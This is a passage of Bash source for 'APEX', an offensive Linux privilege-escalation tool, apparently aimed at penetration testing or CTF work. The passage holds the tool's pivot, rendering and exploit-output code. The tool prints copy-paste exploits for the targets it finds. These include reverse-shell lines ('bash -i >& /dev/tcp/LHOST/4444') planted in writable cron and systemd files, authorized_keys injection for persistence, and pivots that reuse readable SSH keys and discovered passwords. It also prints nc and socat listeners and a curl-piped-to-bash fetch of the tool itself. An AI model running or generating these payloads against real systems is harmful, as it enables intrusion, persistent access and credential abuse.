    [ -z "$me" ] && me="unknown"

    local chains="${APEX_FINDINGS_DIR}/chains.sorted"

    # Already root? Nothing to predict.
    case "$(id -u 2>/dev/null)" in
        0) return 0 ;;
    esac

    # ── Signal 1: SSH private keys we can read but did not write ─────────────
    # SCAN_SSH_KEY_CLEAR finding gives us a key — owner tells us who to pivot to.
    local f rec type path desc
    for f in "$APEX_FINDINGS_DIR"/*.finding; do
        [ -f "$f" ] || continue
        rec=$(head -1 "$f" 2>/dev/null)
        type=$(printf '%s' "$rec" | awk -F'|' '{print $1}')
        path=$(printf '%s' "$rec" | awk -F'|' '{print $2}')
        desc=$(printf '%s' "$rec" | awk -F'|' '{print $3}')
        case "$type" in
            SSH_KEY_CLEAR|SCAN_SSH_KEY_CLEAR)
                local owner
                owner=$(safe_run 2 stat -c '%U' "$path" 2>/dev/null)
                [ -z "$owner" ] && continue
                [ "$owner" = "$me" ] && continue
                printf 'PIVOT %s -> %s : ssh -i %s %s@localhost  (private key readable)\n' \
                    "$me" "$owner" "$path" "$owner"
                ;;
            AUTHKEYS_DIR_WRITABLE|CHECK_AUTHKEYS_INJECTABLE|AUTHKEYS_WRITABLE)
                local owner2
                owner2=$(safe_run 2 stat -c '%U' "$path" 2>/dev/null)
                [ -z "$owner2" ] && continue
                [ "$owner2" = "$me" ] && continue
                printf 'PIVOT %s -> %s : drop key into %s, then ssh %s@localhost\n' \
                    "$me" "$owner2" "$path" "$owner2"
                ;;
            CRED_PLAINTEXT|SCAN_CRED_PLAINTEXT|CRED_PASSWORD|*PASSWORD*|*TOKEN*)
                case "$desc" in
                    *":"*)
                        local cand
                        cand=$(printf '%s' "$desc" | grep -oE '[a-z_][a-z0-9_-]*[[:space:]]*[:=]' \
                              | head -1 | sed 's/[:=].*//; s/[[:space:]]*$//')
                        [ -z "$cand" ] && continue
                        [ "$cand" = "$me" ] && continue
                        printf 'PIVOT %s -> %s : try discovered credential against %s (su or ssh)\n' \
                            "$me" "$cand" "$cand"
                        ;;
                esac
                ;;
        esac
    done | sort -u | head -10

    # ── Signal 2: chain hints from chains.sorted ─────────────────────────────
    if [ -r "$chains" ]; then
        awk -F'|' 'NR<=5 { printf "CHAIN  conf=%s  family=%s  target=%s  lenses=%s\n", $1, $2, $3, $4 }' \
            "$chains" 2>/dev/null
    fi
    return 0
}


# =============================================================================
# SECTION 8 — Output Layer
# =============================================================================
# RULE: every byte echoed to the user passes through safe_output() to strip
# ANSI escapes and control chars. HIGH-7: maker-controlled strings can inject.

safe_output() {
    # HIGH-7: strip ANSI / OSC / C1 sequences and all non-printable bytes
    # from anything echoed to the terminal. Input may be from /proc, file
    # names, strings(1) output, or other maker-controllable sources.
    local data="${1-}"
    printf '%s' "$data" \
        | sed -e 's/\x1b\[[0-9;?]*[A-Za-z]//g' \
              -e 's/\x1b\][^\x07]*\x07//g' \
              -e 's/\x1b[()][AB012]//g' \
              -e 's/\x1b[PX^_][^\x1b]*\x1b\\//g' \
        | tr -cd '[:print:]\t\n'
}
print_banner() {
    # Top header box per 08_OUTPUT_AND_RANKING.md §2.1.
    local host user date_now
    host=$(safe_output "${HOSTNAME_:-$(hostname 2>/dev/null)}")
    user=$(safe_output "${APEX_USER:-$(whoami 2>/dev/null)}")
    date_now=$(safe_output "$(date '+%Y-%m-%d %H:%M' 2>/dev/null)")

    local line1="  APEX v1.0 — Adversarial Privilege Escalation eXaminer"
    local line2
    line2=$(printf '  Target: %s | User: %s | %s' "$host" "$user" "$date_now")

    printf '%s╔══════════════════════════════════════════════════════════════════╗%s\n' "${_c_bcyan:-}" "${_c_reset:-}"
    printf '%s║%s%s%s\n' "${_c_bcyan:-}" "${_c_reset:-}" "$(_pad_line "$line1" 66)" "${_c_bcyan:-}║${_c_reset:-}"
    printf '%s║%s%s%s\n' "${_c_bcyan:-}" "${_c_reset:-}" "$(_pad_line "$line2" 66)" "${_c_bcyan:-}║${_c_reset:-}"
    printf '%s╠══════════════════════════════════════════════════════════════════╣%s\n' "${_c_bcyan:-}" "${_c_reset:-}"
    return 0
}

_pad_line() {
    # Pad a string with spaces to width N. If longer, truncate.
    # Args: text width
    local text="${1-}"
    local width="${2:-66}"
    local len=${#text}
    if [ "$len" -ge "$width" ]; then
        printf '%s' "${text:0:$width}"
        return 0
    fi
    local pad=$(( width - len ))
    printf '%s' "$text"
    while [ "$pad" -gt 0 ]; do
        printf ' '
        pad=$(( pad - 1 ))
    done
    return 0
}
# ── Render module ───────────────────────────────────────────────────────────
# Decides whether to emit ANSI escapes. 8-color only (codes 30-37 + bold) for
# maximum portability across busybox sh, dash, restricted bash, dumb terms, and
# pipe/redirect targets. Auto-disables on NO_COLOR, non-TTY, TERM=dumb, or
# restricted shells. Operator can force with APEX_FORCE_COLOR=1 / APEX_NO_COLOR=1.
APEX_RENDER_MODE="${APEX_RENDER_MODE:-}"

apex_render_detect_mode() {
    APEX_RENDER_MODE="color"
    [ -n "${NO_COLOR:-}" ]            && APEX_RENDER_MODE="plain"
    [ "${APEX_NO_COLOR:-0}" = "1" ]   && APEX_RENDER_MODE="plain"
    if [ "${APEX_FORCE_COLOR:-0}" = "1" ]; then APEX_RENDER_MODE="color"; return 0; fi
    [ -t 1 ] 2>/dev/null || APEX_RENDER_MODE="plain"
    case "${TERM:-}" in ''|dumb) APEX_RENDER_MODE="plain" ;; esac
    case "${-:-}" in *r*) APEX_RENDER_MODE="plain" ;; esac
    return 0
}

apex_c() {
    [ "${APEX_RENDER_MODE:-plain}" = "color" ] || return 0
    case "$1" in
        TITLE)  printf '\033[1;36m' ;;
        BOLD)   printf '\033[1m'    ;;
        DIM)    printf '\033[2m'    ;;
        FAM)    printf '\033[1;33m' ;;
        SEC)    printf '\033[1;34m' ;;
        LBL)    printf '\033[36m'   ;;
        CONF95) printf '\033[1;31m' ;;
        CONF85) printf '\033[1;33m' ;;
        CONF70) printf '\033[33m'   ;;
        CONF50) printf '\033[36m'   ;;
        PERM)   printf '\033[35m'   ;;
        PATHC)  printf '\033[1;35m' ;;
        NO)     printf '\033[31m'   ;;
        YES)    printf '\033[32m'   ;;
        ATT)    printf '\033[1;32m' ;;
        VIC)    printf '\033[1;35m' ;;
        WARN)   printf '\033[1;31m' ;;
        RESET|*) printf '\033[0m'   ;;
    esac
}

apex_rule() {
    printf '%s\n' '------------------------------------------------------------------------'
}

apex_conf_color_tag() {
    local c="${1:-0}"
    case "$c" in ''|*[!0-9]*) echo CONF50; return 0 ;; esac
    if   [ "$c" -ge 90 ]; then echo CONF95
    elif [ "$c" -ge 75 ]; then echo CONF85
    elif [ "$c" -ge 50 ]; then echo CONF70
    else                       echo CONF50
    fi
}

print_header() {
    # Inner detail rows of the header box (see 08_OUTPUT_AND_RANKING.md §2.1).
    # All values pass through safe_output — KERNEL etc. were read from /proc
    # which is attacker-influenceable inside a container.
    local os kern init sel aa cont
    os=$(safe_output "${OS_ID:-?} ${OS_VERSION:-}")
    kern=$(safe_output "${KERNEL:-?}")
    init=$(safe_output "${INIT:-?}")
    sel=$(safe_output "${SELINUX_STATUS:-?}")
    aa=$(safe_output "${APPARMOR_STATUS:-?}")
    case "${IS_CONTAINER:-0}" in
        1|yes|true) cont="Yes (${CONTAINER_TYPE:-?})" ;;
        *)          cont="No" ;;
    esac
    cont=$(safe_output "$cont")

    # Build primitives line — exec dir, python3, base64, /dev/tcp tick marks.
    local prim_exec prim_py prim_b64 prim_tcp
    prim_exec="exec=${EXEC_DIR:-none}"
    if [ -n "${EXEC_DIR:-}" ] && [ "${EXEC_DIR}" != "none" ]; then
        prim_exec="${prim_exec}✓"
    else
        prim_exec="${prim_exec}✗"
    fi
    if [ "${HAS_PYTHON3:-0}" = "1" ]; then prim_py="python3✓"; else prim_py="python3✗"; fi
    if command -v base64 >/dev/null 2>&1; then prim_b64="base64✓"; else prim_b64="base64✗"; fi
    if [ "${HAS_DEV_TCP:-0}" = "1" ] || [ "${HAS_BASH:-0}" = "1" ]; then
        prim_tcp="/dev/tcp✓"
    else
        prim_tcp="/dev/tcp✗"
    fi

    local shell_name shell_row=""
    shell_name=$(safe_output "$(printf '%s' "${SHELL:-?}" | awk -F/ '{print $NF}')")
    if [ "${RESTRICTED:-0}" = "1" ]; then
        shell_row=$(printf '  Shell:       %s (RESTRICTED)' "$shell_name")
    fi

    local row1 row2 row3 row4
    row1=$(printf '  Pre-flight:  OS=%s | Kernel=%s | INIT=%s' "$os" "$kern" "$init")
    row2=$(printf '  Security:    SELinux=%s | AppArmor=%s | Container=%s' "$sel" "$aa" "$cont")
    row3=$(printf '  Primitives:  %s | %s | %s | %s' "$prim_exec" "$prim_py" "$prim_b64" "$prim_tcp")
    row4='  Layers:      Running 1,2,3 in parallel'

    printf '║%s\n' "$(_pad_line "$row1" 66)║"
    printf '║%s\n' "$(_pad_line "$row2" 66)║"
    printf '║%s\n' "$(_pad_line "$row3" 66)║"
    printf '║%s\n' "$(_pad_line "$row4" 66)║"
    [ -n "$shell_row" ] && printf '║%s\n' "$(_pad_line "$shell_row" 66)║"
    printf '╚══════════════════════════════════════════════════════════════════╝\n'
    return 0
}
_complexity_for() {
    # Bucket vector → LOW / MEDIUM / HIGH / VERY_HIGH (08_OUTPUT_AND_RANKING.md §4).
    case "$1" in
        # Order: more specific first (HIGH / VERY_HIGH) before the SUID_* catch-all
        KERNEL_CVE|MAPPER_KERNEL_CVE)
            printf 'VERY_HIGH' ;;
        DEEP_SUID_RPATH_WRITABLE|SUID_CUSTOM|MAPPER_SUID_CUSTOM|DEEP_LD_*|NFS_NO_ROOT_SQUASH|MAPPER_NFS_NO_ROOT_SQUASH)
            printf 'HIGH' ;;
        CRON_*|MAPPER_CRON_*|DEEP_CRON_*|DEEP_UNIT_*|MAPPER_UNIT_*|WRITABLE_ENV_FILE|CUSTOM_SYSTEMD_ROOT_SERVICE|CUSTOM_SYSTEMD_USER_SERVICE|CUSTOM_SYSTEMD_ROOT_SERVICE_WRITABLE|CUSTOM_SYSTEMD_USER_SERVICE_WRITABLE)
            printf 'MEDIUM' ;;
        DEEP_WILDCARD_INJECTION|SHADOW_WRITABLE|DEEP_SHELL_*)
            printf 'MEDIUM' ;;
        SUID_*|MAPPER_SUID_*|SUDO_NOPASSWD|SUDO_NOPASSWD_*|MAPPER_SUDO_*|GROUP_DOCKER|GROUP_LXD|GROUP_LXC|GROUP_DISK|GROUP_SHADOW|MAPPER_GROUP_*)
            printf 'LOW' ;;
        AUTHKEYS_*|CHECK_AUTHKEYS_INJECTABLE|SSH_KEY_CLEAR|SCAN_SSH_KEY_CLEAR|PASSWD_WRITABLE|SUDOERS_WRITABLE)
            printf 'LOW' ;;
        *)
            printf 'MEDIUM' ;;
    esac
}

_time_for() {
    # Rough wall-clock estimate per complexity.
    case "$1" in
        LOW)       printf '~30s' ;;
        MEDIUM)    printf '~2min' ;;
        HIGH)      printf '~5min' ;;
        VERY_HIGH) printf '15+min' ;;
        *)         printf '~?' ;;
    esac
}

_verify_for() {
    # Manual verify command per vector — what to run by hand before exploiting.
    local type="$1" path="$2"
    case "$type" in
        SUID_*|MAPPER_SUID_*)
            printf 'ls -la %s && getcap %s 2>/dev/null' "$path" "$path" ;;
        SUDO_*|MAPPER_SUDO_*)
            printf 'sudo -n -l 2>/dev/null | grep -E "NOPASSWD|env_keep"' ;;
        GROUP_DOCKER|MAPPER_GROUP_DOCKER)
            printf 'id | grep docker && docker info >/dev/null 2>&1 && echo RUNNING' ;;
        GROUP_LXD|GROUP_LXC|MAPPER_GROUP_LXD|MAPPER_GROUP_LXC)
            printf 'id | grep lx && command -v lxc' ;;
        AUTHKEYS_INJECT|AUTHKEYS_WRITABLE)
            local _ak_owner
            _ak_owner=$(stat -c '%U' "$path" 2>/dev/null)
            printf 'ls -la %s && ss -ltn | grep :22 && echo "Target user: %s"' "$path" "${_ak_owner:-?}" ;;
        AUTHKEYS_DIR_INJECT|AUTHKEYS_DIR_WRITABLE|HOME_INJECT)
            printf 'ls -la %s && ss -ltn | grep :22 && ls -la %s/.ssh/ 2>/dev/null' "$path" "$path" ;;
        AUTHKEYS_*|CHECK_AUTHKEYS_INJECTABLE)
            printf 'ls -la %s && ss -ltn | grep :22' "$path" ;;
        SSH_KEY_CLEAR|SCAN_SSH_KEY_CLEAR|ROOT_SSH_KEY_CLEAR)
            printf 'ssh-keygen -l -f %s 2>/dev/null && stat -c "owner=%%U perms=%%a" %s' \
                "$path" "$path" ;;
        CRON_*|MAPPER_CRON_*|DEEP_CRON_*)
            printf 'ls -la %s && grep -nE "PATH=|^[[:space:]]*[0-9*]" %s 2>/dev/null | head -5' \
                "$path" "$path" ;;
        DEEP_UNIT_*|MAPPER_UNIT_*)
            printf 'systemctl cat %s 2>/dev/null | head -20 && ls -la %s' "$path" "$path" ;;
        CUSTOM_SYSTEMD_ROOT_SERVICE|CUSTOM_SYSTEMD_USER_SERVICE|CUSTOM_SYSTEMD_ROOT_SERVICE_WRITABLE|CUSTOM_SYSTEMD_USER_SERVICE_WRITABLE)
            printf 'ls -la %s && stat -c "owner=%%U group=%%G perms=%%a" %s && strings %s 2>/dev/null | grep -E "^(python|python3|sh|bash|perl|ruby|node|systemctl|chmod|chown|tar|cp|mv|wget|curl)$" | head -10 && head -30 %s 2>/dev/null' \
                "$path" "$path" "$path" "$path" ;;
        DEEP_WILDCARD_INJECTION)
            printf 'grep -nE "tar |rsync |chown |chmod " %s' "$path" ;;
        PASSWD_WRITABLE|SHADOW_WRITABLE|SUDOERS_WRITABLE)
            printf 'ls -la %s && lsattr %s 2>/dev/null' "$path" "$path" ;;
        DEEP_LD_*)
            printf 'ls -la %s && cat /etc/ld.so.conf 2>/dev/null' "$path" ;;
        NFS_NO_ROOT_SQUASH|MAPPER_NFS_NO_ROOT_SQUASH)
            printf 'cat /etc/exports 2>/dev/null | grep no_root_squash' ;;
        GROUP_TMUX_HIJACK)
            printf 'find /tmp /run -name "tmux-*" -readable 2>/dev/null; tmux ls 2>/dev/null' ;;
        TMUX_SOCKET_HIJACK)
            printf 'ls -la %s && tmux -S %s list-sessions 2>/dev/null' "$path" "$path" ;;
        SCREEN_SOCKET_HIJACK)
            printf 'ls -la %s && screen -ls 2>/dev/null' "$path" ;;
        HISTORY_UNIX_SOCKET)
            printf 'ss -xap 2>/dev/null | grep -E "live|bank|sock" ; find /opt /var/run /tmp -type s -readable 2>/dev/null' ;;
        HISTORY_UNIX_SOCKET_EXISTS|UNIX_SOCK_*|UNIX_SOCK_LATERAL)
            printf 'ss -xap 2>/dev/null | grep %s && ls -la %s' "$path" "$path" ;;
        KERNEL_LPE_*)
            printf 'uname -r && gcc --version 2>/dev/null | head -1 && git --version 2>/dev/null && id' ;;
        CAP_SETUID|CAP_SYS_ADMIN|CAP_SYS_PTRACE|CAP_DAC|CAP_CHOWN|CAP_RAWIO)
            printf 'getcap %s 2>/dev/null && ls -la %s && [ -x %s ] && echo EXECUTABLE || echo NOT-EXECUTABLE' \
                "$path" "$path" "$path" ;;
        CAP_*|PROC_CAP_*)
            printf 'getcap %s 2>/dev/null && ls -la %s' "$path" "$path" ;;
        WRITE_USER_DOTFILE|WRITE_ROOT_DOTFILE)
            printf 'ls -la %s && lsattr %s 2>/dev/null' "$path" "$path" ;;
        CUSTOM_BIN_PATH_HIJACK|CUSTOM_BIN_WRITABLE|CUSTOM_BIN_WRITABLE_REF)
            printf 'ls -la %s && strings %s 2>/dev/null | grep -E "^[a-z][a-z0-9_-]{1,15}$" | head -20' \
                "$path" "$path" ;;
        GROUP_EXEC_PATH_HIJACK|GROUP_EXEC_ROOT_BINARY)
            printf 'ls -la %s && strings %s 2>/dev/null | grep -E "^(python|python3|sh|bash|perl|ruby)$"' \
                "$path" "$path" ;;
        GROUP_WRITABLE_FILE)
            printf 'ls -la %s && lsattr %s 2>/dev/null && stat -c "owner=%%U group=%%G perms=%%a" %s' \
                "$path" "$path" "$path" ;;
        GROUP_FILES_FOUND)
            local _gname
            _gname=$(printf '%s' "$path" | sed 's/^group://')
            printf 'find / -group %s -ls 2>/dev/null | head -30' "$_gname" ;;
        PSPY_ROOT_RELATIVE_CMD|PSPY_DIR_HIJACK|PSPY_DIR_HIJACK_ROOT)
            printf 'ps aux | grep -i root | head -20; ls -la %s' "$path" ;;
        PSPY_CRON_WRITABLE_CMD|PSPY_WRITABLE_EXEC_LATERAL|PSPY_ROOT_EXEC_WRITABLE)
            printf 'ls -la %s && crontab -l 2>/dev/null; cat /etc/crontab 2>/dev/null' "$path" ;;
        LATERAL_CRON_WRITABLE_HOME)
            printf 'ls -la %s && crontab -l 2>/dev/null; ls -la $(dirname %s) 2>/dev/null' "$path" "$path" ;;
        *)
            printf 'ls -la %s' "$path" ;;
    esac
}

print_confirmed_path() {
    # Style A formal cards (no boxes). Each finding: SUMMARY → LOCATION →
    # VERIFY → PRIMARY EXPLOIT → ALTERNATIVE EXPLOIT → UNSURE? → 72-dash rule.
    # All colors optional via apex_c (auto-disabled on dumb terms / pipes).
    [ -n "$APEX_FINDINGS_DIR" ] && [ -d "$APEX_FINDINGS_DIR" ] || return 0

    local chains="${APEX_FINDINGS_DIR}/chains.sorted"
    if [ ! -s "$chains" ]; then
        build_confirmed_chains >/dev/null 2>&1
    fi
    [ -s "$chains" ] || return 0

    local total cur
    total=$(wc -l < "$chains" 2>/dev/null | tr -d ' ')
    [ -z "$total" ] && total=0
    [ "$total" -gt 5 ] && total=5
    cur=0

    printf '\n'
    apex_c TITLE; printf 'CONFIRMED PRIVILEGE-ESCALATION PATHS'; apex_c RESET; printf '\n'
    apex_rule

    while IFS='|' read -r conf family path lcsv tcsv desc; do
        cur=$(( cur + 1 ))
        [ "$cur" -gt "$total" ] && break

        local primary_type
        primary_type=$(printf '%s' "$tcsv" | awk -F',' '{print $1}')
        local cplex tm
        cplex=$(_complexity_for "$primary_type")
        tm=$(_time_for "$cplex")

        local s_path s_desc s_lcsv s_tcsv
        s_path=$(safe_output "$path")
        s_desc=$(safe_output "$desc")
        s_lcsv=$(safe_output "$lcsv")
        s_tcsv=$(safe_output "$tcsv")

        local conf_tag
        conf_tag=$(apex_conf_color_tag "$conf")

        # Header line: [FINDING N/M]  CONFIDENCE: NN%  COMPLEXITY: X  EST: T
        apex_c BOLD; printf '[FINDING %d/%d]' "$cur" "$total"; apex_c RESET
        printf '   '
        apex_c LBL; printf 'CONFIDENCE: '; apex_c RESET
        apex_c "$conf_tag"; printf '%s%%' "$conf"; apex_c RESET
        printf '   '
        apex_c LBL; printf 'COMPLEXITY: '; apex_c RESET
        printf '%s' "$cplex"
        printf '   '
        apex_c LBL; printf 'EST. TIME: '; apex_c RESET
        printf '%s\n' "$tm"

        # Fact rows (formal labels, aligned with 11-char gutter)
        apex_c SEC; printf 'VECTOR:    '; apex_c RESET
        apex_c FAM; printf '%s\n' "$s_tcsv"; apex_c RESET

        apex_c SEC; printf 'TARGET:    '; apex_c RESET
        apex_c PATHC; printf '%s\n' "$s_path"; apex_c RESET

        apex_c SEC; printf 'LENSES:    '; apex_c RESET
        printf '%s\n' "$s_lcsv"

        # DESC wrap at 80 chars, first line takes the label
        apex_c SEC; printf 'DESC:      '; apex_c RESET
        local _first=1
        printf '%s\n' "$s_desc" | fold -sw 69 | while IFS= read -r _dl; do
            if [ "$_first" = "1" ]; then
                printf '%s\n' "$_dl"; _first=0
            else
                printf '           %s\n' "$_dl"
            fi
        done

        # VERIFY FIRST — formal label, raw commands one-per-line
        local verify_cmd
        verify_cmd=$(_verify_for "$primary_type" "$path")
        printf '\n'
        apex_c SEC; printf 'VERIFY FIRST'; apex_c RESET
        printf ' (confirm conditions before exploit):\n'
        if [ -n "$verify_cmd" ]; then
            printf '%s\n' "$verify_cmd" | while IFS= read -r _vl; do
                printf '  %s\n' "$(safe_output "$_vl")"
            done
        else
            printf '  ls -la %s\n' "$s_path"
        fi

        # Trap warning (between verify and exploit so operator reads it)
        local trap_txt
        trap_txt=$(trap_warning_lookup "$primary_type")
        if [ -n "$trap_txt" ]; then
            printf '\n'
            apex_c WARN; printf 'TRAP:'; apex_c RESET; printf '\n'
            printf '%s\n' "$trap_txt" | while IFS= read -r tline; do
                printf '  %s\n' "$(safe_output "$tline")"
            done
        fi

        # PRIMARY EXPLOIT — copy-paste block, no prefix chars
        local exp_txt
        exp_txt=$(_get_stored_exploit "$primary_type" "$path")
        if [ -z "$exp_txt" ]; then
            local _vt _alt _types_list
            _types_list=$(printf '%s\n' "$s_tcsv" | tr ',' '\n')
            while IFS= read -r _vt; do
                [ "$_vt" = "$primary_type" ] && continue
                _alt=$(_get_stored_exploit "$_vt" "$path")
                if [ -n "$_alt" ]; then exp_txt="$_alt"; break; fi
            done <<< "$_types_list"
        fi
        [ -z "$exp_txt" ] && exp_txt=$(generate_exploit_command "$primary_type" "$path" "$desc")

        if [ -n "$exp_txt" ]; then
            printf '\n'
            apex_c SEC; printf 'PRIMARY EXPLOIT'; apex_c RESET
            printf ' (copy-paste as one block):\n'
            printf '%s\n' "$exp_txt" | while IFS= read -r eline; do
                printf '  %s\n' "$(safe_output "$eline")"
            done
        fi

        # ALTERNATIVE EXPLOIT — secondary payload variants
        local alt_exp="" alt_label=""
        case "$primary_type" in
            CUSTOM_BIN_PATH_HIJACK|GROUP_EXEC_PATH_HIJACK)
                local _xd="${APEX_EXEC_DIR:-/tmp}"
                local _interp
                _interp=$(printf '%s' "$desc" | grep -oE "calls '[a-z][a-z0-9_-]+'" | grep -oE "'[^']+'" | tr -d "'")
                [ -z "$_interp" ] && _interp="python3"
                alt_label="reverse shell — set LHOST/LPORT first"
                alt_exp="PATH=${_xd}:\$PATH
printf '#!/bin/bash\nbash -i >& /dev/tcp/LHOST/LPORT 0>&1\n' > ${_xd}/${_interp}
chmod +x ${_xd}/${_interp}
${path}"
                ;;
            PSPY_DIR_HIJACK|PSPY_DIR_HIJACK_ROOT|FOREIGN_FILE_IN_WRITABLE_DIR|LATERAL_CRON_WRITABLE_HOME)
                alt_label="plant authorized_keys (persistent)"
                alt_exp="rm -f ${path}
cat > ${path} <<'EOF'
#!/bin/bash
mkdir -p ~/.ssh
cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys 2>/dev/null
EOF
chmod +x ${path}
# wait for the job to fire (cron/service); then: ssh user@host"
                ;;
        esac

        if [ -n "$alt_exp" ]; then
            printf '\n'
            apex_c SEC; printf 'ALTERNATIVE EXPLOIT'; apex_c RESET
            printf ' (%s):\n' "$alt_label"
            printf '%s\n' "$alt_exp" | while IFS= read -r eline; do
                printf '  %s\n' "$(safe_output "$eline")"
            done
        fi

        # UNSURE? fingerprint hint — always shown so operator has a fallback
        printf '\n'
        apex_c SEC; printf 'UNSURE?'; apex_c RESET
        printf ' run this first to fingerprint:\n'
        printf '  ls -la %s 2>/dev/null; file %s 2>/dev/null; stat -c "owner=%%U group=%%G perms=%%a" %s 2>/dev/null\n' \
            "$s_path" "$s_path" "$s_path"

        printf '\n'
        apex_rule
    done < "$chains"
    return 0
}

print_layer_status() {
    # Args: layer_num layer_name state count [recommendation]
    # state ∈ COMPLETE, RUNNING, SKIPPED
    local num="${1:-?}"
    local name="${2:-?}"
    local state="${3:-COMPLETE}"
    local count="${4:-0}"
    local rec="${5-}"

    name=$(safe_output "$name")
    state=$(safe_output "$state")
    rec=$(safe_output "$rec")

    printf '\n[APEX] Layer %s (%s) — %s\n' "$num" "$name" "$state"
    case "$state" in
        COMPLETE)
            printf '       Found: %s confirmed finding(s)\n' "$count"
            [ -n "$rec" ] && printf '       Recommendation: %s\n' "$rec"
            ;;
        RUNNING)
            printf '       Status: running in parallel with other layers\n'
            ;;
        SKIPPED)
            printf '       Skipped (prior layer already produced high-confidence paths)\n'
            ;;
    esac
    return 0
}

print_empty_layer() {
    # Empty-layer transition (08_OUTPUT_AND_RANKING.md §2.4)
    # Args: layer_num layer_name next_num next_name
    local num="${1:-?}"
    local name nnum nname
    name=$(safe_output "${2:-?}")
    nnum="${3:-?}"
    nname=$(safe_output "${4:-?}")

    printf '\n[APEX] Layer %s exhausted. No %s-based paths confirmed.\n' "$num" "$name"
    printf '\n'
    printf '       BEFORE ACCEPTING THIS: verify you ran:\n'
    printf '       □ sudo -n -l            (NOPASSWD entries shown?)\n'
    printf '       □ getcap -r / 2>/dev/null\n'
    printf '       □ /etc/crontab + /etc/cron.d/ + /etc/periodic/\n'
    printf '       □ systemctl list-timers --all\n'
    printf '       □ find / -perm -4000 -type f 2>/dev/null\n'
    printf '\n'
    printf '[APEX] Activating Layer %s: %s\n' "$nnum" "$nname"
    return 0
}

print_final_watch_actions() {
    # Layer 11 — Final Watch (E1-E5):
    # For every dynamically-observed (pspy) writable path run by another user
    # AND every C4 writable systemd target, print:
    #   ATTACKER step: listener (penelope > nc > socat fallback)
    #   VICTIM step 1: backup the original file
    #   VICTIM step 2: drop payload (heredoc preserved)
    #   VICTIM step 3: restore the original (revert if listener silent)
    #
    # Also prints "no actions" footer if pspy never produced findings, so the
    # operator knows to re-run with a writable exec dir.
    [ -n "$APEX_FINDINGS_DIR" ] && [ -d "$APEX_FINDINGS_DIR" ] || return 0

    # Collect actionable findings: any vector where WE write + something else runs.
    local actions_tmp="${APEX_TMP:-/tmp}/_l11_$$"
    : > "$actions_tmp"
    local f rec t path desc lhost
    for f in "$APEX_FINDINGS_DIR"/*.finding; do
        [ -f "$f" ] || continue
        rec=$(head -1 "$f" 2>/dev/null)
        t=$(printf '%s' "$rec" | awk -F'|' '{print $1}')
        path=$(printf '%s' "$rec" | awk -F'|' '{print $2}')
        desc=$(printf '%s' "$rec" | awk -F'|' '{print $3}')
        case "$t" in
            PSPY_WRITABLE_EXEC_LATERAL|PSPY_ROOT_EXEC_WRITABLE|\
            PSPY_DIR_HIJACK|PSPY_DIR_HIJACK_ROOT|PSPY_CRON_WRITABLE_CMD|\
            CUSTOM_SYSTEMD_ROOT_SERVICE_WRITABLE|CUSTOM_SYSTEMD_USER_SERVICE_WRITABLE|\
            FOREIGN_FILE_IN_WRITABLE_DIR|LATERAL_CRON_WRITABLE_HOME)
                printf '%s|%s|%s\n' "$t" "$path" "$desc" >> "$actions_tmp"
                ;;
        esac
    done

    printf '\n'
    apex_c TITLE; printf 'LAYER 11 — FINAL WATCH (write→wait→listener)'; apex_c RESET; printf '\n'
    apex_rule

    if [ ! -s "$actions_tmp" ]; then
        printf 'No write-and-wait surfaces detected.\n'
        printf 'If pspy did not run (no APEX_ORIGIN reachable), retry via:\n'
        printf '  bash <(curl -fsSL %s/apex.sh)\n' "${APEX_ORIGIN_BASE:-http://YOUR_KALI:PORT}"
        printf '\n'
        rm -f "$actions_tmp" 2>/dev/null
        return 0
    fi

    # Pick a sensible LHOST hint — APEX_ORIGIN host if present.
    lhost=""
    if [ -n "$APEX_ORIGIN_BASE" ]; then
        lhost=$(printf '%s' "$APEX_ORIGIN_BASE" | sed -E 's|https?://([^:/]+).*|\1|')
    fi
    [ -z "$lhost" ] && lhost="LHOST"

    # Print attacker listener block ONCE at the top — same listener serves all victims.
    apex_c SEC; printf 'ATTACKER (run on Kali — pick ONE, leave it listening):'; apex_c RESET; printf '\n'
    printf '  # OPTION A — Penelope (best UX, auto-stab tty, works for ssh-key drops too)\n'
    printf '  python3 -m penelope -p 4444\n'
    printf '\n'
    printf '  # OPTION B — netcat (ubiquitous)\n'
    printf '  nc -lvnp 4444\n'
    printf '\n'
    printf '  # OPTION C — socat (full pty, survives Ctrl-C in shell)\n'
    printf '  socat -d -d FILE:`tty`,raw,echo=0 TCP-LISTEN:4444\n'
    printf '\n'
    apex_rule

    local i=0 cur_t cur_path cur_desc bn bk_path
    while IFS='|' read -r cur_t cur_path cur_desc; do
        i=$(( i + 1 ))
        bn=$(basename "$cur_path" 2>/dev/null)
        bk_path="/tmp/_apex_bk_${bn}_$$"

        apex_c BOLD; printf '[ACTION %d] %s' "$i" "$cur_t"; apex_c RESET; printf '\n'
        apex_c SEC; printf 'TARGET:    '; apex_c RESET
        apex_c PATHC; printf '%s\n' "$(safe_output "$cur_path")"; apex_c RESET
        apex_c SEC; printf 'CONTEXT:   '; apex_c RESET
        printf '%s\n' "$(safe_output "$cur_desc" | cut -c1-200)"
        printf '\n'

        # VICTIM step 1: backup
        apex_c SEC; printf 'VICTIM step 1 — BACKUP (always do this first):'; apex_c RESET; printf '\n'
        case "$cur_t" in
            PSPY_DIR_HIJACK|PSPY_DIR_HIJACK_ROOT|FOREIGN_FILE_IN_WRITABLE_DIR|LATERAL_CRON_WRITABLE_HOME)
                printf '  cp -p %s %s 2>/dev/null || echo "(file did not exist — recreate-only mode)"\n' \
                    "$cur_path" "$bk_path"
                ;;
            *)
                printf '  cp -p %s %s\n' "$cur_path" "$bk_path"
                ;;
        esac
        printf '\n'

        # VICTIM step 2: payload
        apex_c SEC; printf 'VICTIM step 2 — PAYLOAD (replace LHOST=%s if needed):' "$lhost"; apex_c RESET; printf '\n'
        case "$cur_t" in
            PSPY_DIR_HIJACK|PSPY_DIR_HIJACK_ROOT|FOREIGN_FILE_IN_WRITABLE_DIR|LATERAL_CRON_WRITABLE_HOME|\
            CUSTOM_SYSTEMD_ROOT_SERVICE_WRITABLE|CUSTOM_SYSTEMD_USER_SERVICE_WRITABLE|\
            PSPY_WRITABLE_EXEC_LATERAL|PSPY_ROOT_EXEC_WRITABLE|PSPY_CRON_WRITABLE_CMD)
                printf '  rm -f %s\n' "$cur_path"
                printf "  cat > %s <<'EOF'\n" "$cur_path"
                printf '  #!/bin/bash\n'
                printf '  bash -i >& /dev/tcp/%s/4444 0>&1\n' "$lhost"
                printf '  EOF\n'
                printf '  chmod +x %s\n' "$cur_path"
                printf '  # Now wait for the cron/service to fire (typically <60s)\n'
                ;;
        esac
        printf '\n'

        # VICTIM step 3: restore
